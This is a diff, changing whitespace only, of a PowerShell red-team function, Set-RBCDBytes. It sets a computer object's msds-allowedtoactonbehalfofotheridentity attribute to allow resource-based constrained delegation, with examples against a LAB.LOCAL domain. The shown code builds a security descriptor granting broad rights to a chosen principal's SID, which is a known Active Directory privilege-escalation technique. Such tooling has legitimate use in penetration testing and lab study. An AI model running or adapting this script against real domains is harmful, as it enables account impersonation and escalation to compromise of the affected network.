@@ -2,8 +2,7 @@
 <# 
 .SYNOPSIS
     Sets the msds-allowedtoactonbehalfofotheridentity property on a computer object to allow RBCD.
-	
-	Author: @Haus3c
+    Author: @Haus3c
 	
 .PARAMETER 
     -Domain 
@@ -17,13 +16,14 @@
 	
 .EXAMPLE 
     Set-RBCDBytes -Domain LAB.LOCAL -TargetComputer LABWIN10 -Principal 'LABWIN10$'
-	Set-RBCDBytes -Domain LAB.LOCAL -TargetComputer LABWIN10 -Principal Bob
+    Set-RBCDBytes -Domain LAB.LOCAL -TargetComputer LABWIN10 -Principal Bob
 #>
     [CmdletBinding()]
     Param(
     [Parameter(Mandatory=$True)][String]$Domain = $null,
     [Parameter(Mandatory=$True)][String]$TargetComputer = $null,
     [Parameter(Mandatory=$True)][String]$Principal = $null)
+    
     $ID = new-object System.Security.Principal.NTAccount($Domain+"\"+$Principal)
     $SID =  $ID.Translate( [System.Security.Principal.SecurityIdentifier] ).toString()
     $SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($SID))"
